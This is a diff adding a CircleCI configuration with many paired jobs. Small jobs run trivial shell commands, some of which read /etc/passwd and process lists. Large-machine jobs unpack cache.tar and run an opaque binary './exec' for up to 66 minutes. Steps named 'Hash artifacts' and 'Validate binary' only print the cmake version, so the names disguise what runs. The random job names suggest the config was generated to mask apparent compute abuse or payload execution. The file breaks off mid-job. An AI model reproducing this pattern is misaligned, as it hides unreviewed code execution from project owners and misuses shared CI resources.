@@ -1,0 +1,1463 @@
+version: 2.1
+
+jobs:
+  reload_dec10-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: orbital pass
+          command: |
+            mkdir -p /tmp/share
+            set +o pipefail 2>/dev/null; seq 1 1127410 | awk '{print $1*7919 % 2147483647}' > /tmp/share/.ready; true
+            len=$(wc -c </tmp/share/.ready); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - .ready
+  dec10-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/.ready || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  drain_QA_BUILD_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: nope not now
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /tmp/share/buffer.blob
+            len=$(wc -c </tmp/share/buffer.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - buffer.blob
+  QA_BUILD_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/buffer.blob || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  vendor_nov6-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: spiral in
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10;i++)printf "%d:%d\n",i,i*i}' | wc -l; true ; } > /tmp/share/pt-main.pickle
+            len=$(wc -c </tmp/share/pt-main.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - pt-main.pickle
+  nov6-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/pt-main.pickle || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  drain_delta-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: drip drop
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk 'BEGIN{min=999999}{if($1>max)max=$1; if($1<min)min=$1}END{print min, max}'; true ; } > /tmp/share/phase-done.log
+            len=$(wc -c </tmp/share/phase-done.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - phase-done.log
+  delta-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/phase-done.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  Gamma_update-oauth-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: quadruple knock
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)if(i*i == int(i*i))x++; print x}'; true ; } > /tmp/share/secondary_job_output.txt
+            len=$(wc -c </tmp/share/secondary_job_output.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - secondary_job_output.txt
+  update-oauth-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/secondary_job_output.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  audit_INFRA-404:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: cast off
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 684600 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/share/full_task_output.out
+            len=$(wc -c </tmp/share/full_task_output.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - full_task_output.out
+  INFRA-404:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/full_task_output.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  stepA_qa-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: leg extend
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; sort /etc/passwd | wc -l; true ; } > /tmp/share/manifest.pkg
+            len=$(wc -c </tmp/share/manifest.pkg); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - manifest.pkg
+  qa-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/manifest.pkg || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  fixture_romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: against grain
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/share/timings.jsonl
+            len=$(wc -c </tmp/share/timings.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - timings.jsonl
+  romeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/timings.jsonl || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  prep_DeployImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: valley
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; head -c 2048 /dev/urandom | md5sum | awk '{print $1}'; true ; } > /tmp/share/36.blob
+            len=$(wc -c </tmp/share/36.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 36.blob
+  DeployImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/36.blob || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  Gamma_go1-21-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: tornado alley
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{m[3]=3; m[7]=7; m[2]=2; for(k in m)print k}' | sort -n; true ; } > /tmp/share/stage-pass.out
+            len=$(wc -c </tmp/share/stage-pass.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - stage-pass.out
+  go1-21-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/stage-pass.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  linter_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: TODO fix me
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; date +%Z; true ; } > /tmp/share/FINAL.txt
+            len=$(wc -c </tmp/share/FINAL.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - FINAL.txt
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/FINAL.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  Delta_validate-end-to-end-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; IFS=',' read -ra arr <<<"x,y,z,w" && echo ${arr[2]}; true ; } > /tmp/share/summary.txt
+            len=$(wc -c </tmp/share/summary.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - summary.txt
+  validate-end-to-end-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/summary.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  redo_alice-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: plank hold
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "Multi Word String" | awk '{gsub(/ /,"-"); print tolower($0)}'; true ; } > /tmp/share/58.bin
+            len=$(wc -c </tmp/share/58.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 58.bin
+  alice-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/58.bin || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  phase2_full-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: upbeat
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $(( RANDOM + RANDOM )) | md5sum; true ; } > /tmp/share/primary_job_output.log
+            len=$(wc -c </tmp/share/primary_job_output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - primary_job_output.log
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/primary_job_output.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  fetch_APP-863:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: plywood cut
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /tmp/share/full_job_output.out
+            len=$(wc -c </tmp/share/full_job_output.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - full_job_output.out
+  APP-863:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/full_job_output.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  staging_fix-dashboard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: tide
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/share/gate-complete.out
+            len=$(wc -c </tmp/share/gate-complete.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - gate-complete.out
+  fix-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/gate-complete.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  orchestrate_ed-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: or else
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $BASH_VERSION; true ; } > /tmp/share/payload.bin
+            len=$(wc -c </tmp/share/payload.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - payload.bin
+  ed-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/payload.bin || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  orchestrate_titan-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: jump squat
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'END{print NR*NR+1}'; true ; } > /tmp/share/2023-10-11.data
+            len=$(wc -c </tmp/share/2023-10-11.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 2023-10-11.data
+  titan-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/2023-10-11.data || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  prebuild_go1-21-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cleat hitch
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "Multi Word String" | awk '{gsub(/ /,"-"); print tolower($0)}'; true ; } > /tmp/share/phase-ready.txt
+            len=$(wc -c </tmp/share/phase-ready.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - phase-ready.txt
+  go1-21-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/phase-ready.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  green_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: in irons
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "pattern" | sed 's/a/x/g'; true ; } > /tmp/share/main_task_output_v4.log
+            len=$(wc -c </tmp/share/main_task_output_v4.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - main_task_output_v4.log
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/main_task_output_v4.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  postcheck_ci-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: burpee
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; ls -la /proc/self | head -3; true ; } > /tmp/share/522.out
+            len=$(wc -c </tmp/share/522.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 522.out
+  ci-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/522.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  Alpha_lima:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: pleasantly full
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; ps -eo comm 2>/dev/null | sort | uniq | head -10; true ; } > /tmp/share/204.out
+            len=$(wc -c </tmp/share/204.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 204.out
+  lima:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/204.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  Delta_atlas-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: noise floor
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="aaabbbccc"; gsub(/[ac]/,"-",s); print s}'; true ; } > /tmp/share/checkpoint-D.pkl
+            len=$(wc -c </tmp/share/checkpoint-D.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - checkpoint-D.pkl
+  atlas-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/checkpoint-D.pkl || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  reserve_rust-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: pot hanger
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $(( RANDOM + RANDOM )) | md5sum; true ; } > /tmp/share/88.log
+            len=$(wc -c </tmp/share/88.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 88.log
+  rust-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/88.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  preflight_sierra-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: coverage pass
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; date -d "next Friday" +%A 2>/dev/null || date +%A; true ; } > /tmp/share/step-29.log
+            len=$(wc -c </tmp/share/step-29.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-29.log
+  sierra-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/step-29.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  db_preview-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: retry 7
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{if($1>25)print}' | head -5; true ; } > /tmp/share/payload
+            len=$(wc -c </tmp/share/payload); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - payload
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/payload || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  kick_anothr-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: leg curl
+          command: |
